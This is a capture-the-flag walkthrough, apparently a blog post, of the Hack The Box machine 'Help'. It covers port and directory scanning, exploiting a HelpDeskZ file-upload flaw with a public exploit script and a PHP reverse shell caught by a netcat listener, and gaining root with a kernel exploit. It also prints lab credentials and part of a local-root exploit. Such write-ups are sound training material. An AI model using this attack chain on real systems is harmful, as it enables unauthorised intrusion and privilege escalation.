---
published: false
---
# HTB - Help

Hackthebox.eu virtual machine; Excellent box and a bit of a desk+head slammer. You must learn to bend space and time to proceed to victory.

----------

Legal Usage:
*The information provided by execute@will is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.*

*By continued reading, you acknowledge the aforementioned user risk/responsibilities.*


----------

target ip: 10.10.10.121

#Enumeration:

nmap scan:

    nmap -sC -sV -oA help.nmap 10.10.10.121
![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548087260983_image.png)


open ports:
22/tcp - ssh
80/tcp - webpage
3000/tcp - Node.js Express Framework - unknown

port 80 - 

![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548087421563_image.png)


port 3000

![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548087495907_image.png)


Potential user name: Shiv

intercept page:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548087829229_image.png)


gobuster:

    gobuster -u http://10.10.10.121 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.out

Discovered:
/support

![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548088397732_image.png)


/javascript

![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548088447947_image.png)


possible FOOTHOLD via submit ticket page

![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548089133885_image.png)


user hash:  bb8a7b36bdce0c61ccebaa173ef946af

![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548373132107_image.png)



found this

    $ cat linux_privesc.py
    #!/usr/env python
    
    ###############################################################################################################
    ## [Title]: linuxprivchecker.py -- a Linux Privilege Escalation Check Script
    ## [Author]: Mike Czumak (T_v3rn1x) -- @SecuritySift
    ##-------------------------------------------------------------------------------------------------------------
    ## [Details]:
    ## This script is intended to be executed locally on a Linux box to enumerate basic system info and
    ## search for common privilege escalation vectors such as world writable files, misconfigurations, clear-text
    ## passwords and applicable exploits.
    ##-------------------------------------------------------------------------------------------------------------
    ## [Warning]:
    ## This script comes as-is with no promise of functionality or accuracy.  I have no plans to maintain updates,
    ## I did not write it to be efficient and in some cases you may find the functions may not produce the desired
    ## results.  For example, the function that links packages to running processes is based on keywords and will
    ## not always be accurate.  Also, the exploit list included in this function will need to be updated over time.
    ## Feel free to change or improve it any way you see fit.
    


s-nail-privget

    $ cat s-nail-privget                                                                                                                                                           
    "/*                                                                                                                                                                            
    ** 26/01/2016: s-nail-privsep local root by @wapiflapi                                                                                                                         
    ** The setuid s-nail-privsep binary has a directory traversal bug.                                                                                                             
    ** This lets us be owner of a file at any location root can give us one,                                                                                                       
    ** only for a very short time though. So we have to race a bit :-)                                                                                                             
    ** Here we abuse the vuln by creating a polkit policy letting us call pkexec su.                                                                                               
    **                                                                                                                                                                             
    ** gcc s-nail-privget.c -o s-nail-privget                                                                                                                                      
    **                                                                                                                                                                             
    ** # for ubuntu:                                                                                                                                                               
    ** ./s-nail-privget /usr/lib/s-nail/s-nail-privsep                                                                                                                             
    ** # for archlinux:                                                                                                                                                            
    ** ./s-nail-privget /usr/lib/mail-privsep                                                                                                                                      
    */                                                                                                                                                                             
                                                                                                                                                                                   
    #define _GNU_SOURCE                                                                                                                                                            
                                                                                                                                                                                   
    #include <unistd.h>                                                                                                                                                            
    #include <stdlib.h>                                                                                                                                                            
    #include <string.h>                                                                                                                                                            
    #include <stdio.h>       


passwd:

    help@help:/dev/shm$ cat /etc/passwd|grep bash
    root:x:0:0:root:/root:/bin/bash
    help:x:1000:1000:help,,,:/home/help:/bin/bash
    


/includes/config.php

    help@help:/var/www/html/support/includes$ cat config.php 
    <?php
            $config\['Database'\]['dbname'] = 'support';
            $config\['Database'\]['tableprefix'] = '';
            $config\['Database'\]['servername'] = 'localhost';
            $config\['Database'\]['username'] = 'root';
            $config\['Database'\]['password'] = 'helpme';
            $config\['Database'\]['type'] = 'mysqli';
            ?>help@help:/var/www/html/support/includes$ 
    


/support/uploads/tickets

![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548374180715_image.png)


.bash_history

    help@help:/home/help$ cat .bash_history
    sudo mkdir lol
    ls -la
    cat .bash_history
    rm -rf .bash_history
    touch .bash_history
    ls -la
    su
    su
    rOOTmEoRdIE
    su
    MS'
    exit
    /
    al
    ;
    `
    \
    '
    su
    cd help
    cd /help
    cd  src
    ls
    cd graphql
    ls
    cd schema/
    ls
    cd resolvers/
    ls
    cat index.js
    cd
    cd help
    ls
    npm run build
    reboot
    sudo shutdown
    Ctrl-Z
    stty -echo raw; nc -lp 1337; stty sane
    fcdcd
    


To connect to listener - setup

Locally:

    nc -lvnp 9001

edit php reverse shell to include correct local IP and PORT

![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548551533903_image.png)


searchsploit for Helpdeskz

    searchsploit helpdeskz
![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548551686619_image.png)


Download 40300.py locally and examine

    searchspoit -m exploits/php/webapps/40300.py
![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548551991954_image.png)


from code review we can see that time.time() is called (highlighted)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548552051980_image.png)



check time of webserver and verify against local

    whatweb -v http://10.10.10.121/support 
![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548551921211_image.png)


check local time

    date

From browser navigate to “Submit a Ticket”

    http:/10.10.10.121/support
![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548552214788_image.png)


Continue with the submit a ticket and upload reverse tcp connection php file (1234.php) in this case.

![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548552400587_image.png)




![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548552470781_image.png)


prompted with “File is not allowed” which is a false statement because file was uploaded successfully to the ticketing site.

Next to locate the location of the uploaded files we need a copy of the helpdeskz source which can be found:

    http://www.helpdeskz.com/download

after a local install of the software we can verify that the files will be uploaded to location:

    .../support/uploads/tickets/

Quickly after file is uploaded and prompted we want to execute the 40300.py exploit and after execution we want to keep an eye on our listener on port 9000.

    python 40300.py http://10.10.10.121/support/uploads/tickets/ 1234.php

#Two events might unfold

1. Your file uploaded that was md5hashed will be found and a link will be given to you.
2. Your listener will catch the return when your file is accessed.
![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548552778212_image.png)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548552865962_image.png)


navigate to /home/help & cat user.txt

![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548552976496_image.png)



#NOW WE ESCALATE!

navigate to /dev/shm and upload LinEnum and discover that the kernel is exploitable 

![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548553075680_image.png)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548553147160_image.png)


download locally:

    searchsploit -m exploits/linux/local/44298.c
![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548553237632_image.png)


Upload to /dev/shm/ and gcc

    gcc 44298.c -o priv

execute priv

    ./priv

#WELCOME TO FLAVOR COUNTRY DESTINATION YOU!

![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548553340637_image.png)



  go get the goods located at
    /root/root.txt
![](https://d2mxuefqeaa7sj.cloudfront.net/s_1AFCA0806F8747ED2BCE9486EE0D98F0048234983B66B548511F5C597AFA9893_1548553424125_image.png)



